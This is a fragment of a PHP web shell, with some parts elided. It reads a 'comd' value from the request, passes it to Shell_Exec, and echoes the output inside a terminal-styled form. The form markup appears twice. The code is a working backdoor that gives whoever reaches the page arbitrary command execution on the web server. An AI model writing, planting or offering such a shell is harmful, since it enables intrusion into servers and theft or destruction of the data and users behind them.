...
?>
<div>
<?php $cmd = stripslashes($_REQUEST["comd"]); ?>
<form method=POST>
<input type=TEXT name="comd" size=64 value="<?php echo $cmd; ?>" style="background:#020;color:#0F0;">
</form>
<form method=POST>
<input type=TEXT name="comd" size=64 value="<?php echo $cmd; ?>" style="background:#020;color:#0F0;">
</form>
...
<div>
<pre><?php echo htmlentities(Shell_Exec($cmd)); ?></pre></td>
</div>